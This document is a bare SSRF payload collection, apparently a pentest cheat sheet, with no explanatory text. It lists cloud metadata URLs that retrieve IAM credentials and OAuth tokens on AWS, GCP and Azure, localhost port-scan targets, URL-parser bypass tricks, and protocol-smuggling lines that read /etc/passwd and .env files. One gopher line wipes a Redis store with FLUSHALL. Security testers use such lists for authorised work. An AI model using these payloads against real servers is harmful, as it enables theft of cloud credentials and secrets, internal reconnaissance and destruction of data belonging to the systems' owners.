# SSRF Payload Collection

## AWS Cloud Metadata
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
```

## GCP Cloud Metadata
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/attributes/
```

## Azure Cloud Metadata
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

## Other cloud metadata
```
# DigitalOcean
http://169.254.169.254/metadata/v1.json
# Oracle Cloud
http://169.254.169.254/opc/v1/instance/
# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
```

## Internal port scanning
```
http://127.0.0.1:22/
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:8080/
http://127.0.0.1:9200/
http://127.0.0.1:27017/
http://localhost/
http://[::1]:80/
http://0.0.0.0/
```

## Internal service interaction
```
http://169.254.169.254/
http://metadata.google.internal/
http://kubernetes.default.svc/
http://100.100.100.200/latest/meta-data/
```

## URL parser bypass tricks
```
http://expected-host@127.0.0.1/
http://127.0.0.1#@expected-host/
http://expected-host%00@127.0.0.1/
http://2130706433/  (127.0.0.1 decimal)
http://0x7f000001/  (127.0.0.1 hex)
http://0177.0.0.1/  (127.0.0.1 octal)
http://127.0.0.1.nip.io/
http://[::ffff:127.0.0.1]/
```

## Protocol smuggling
```
file:///etc/passwd
file:///proc/self/environ
file:///app/.env
file:///Windows/win.ini
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
```
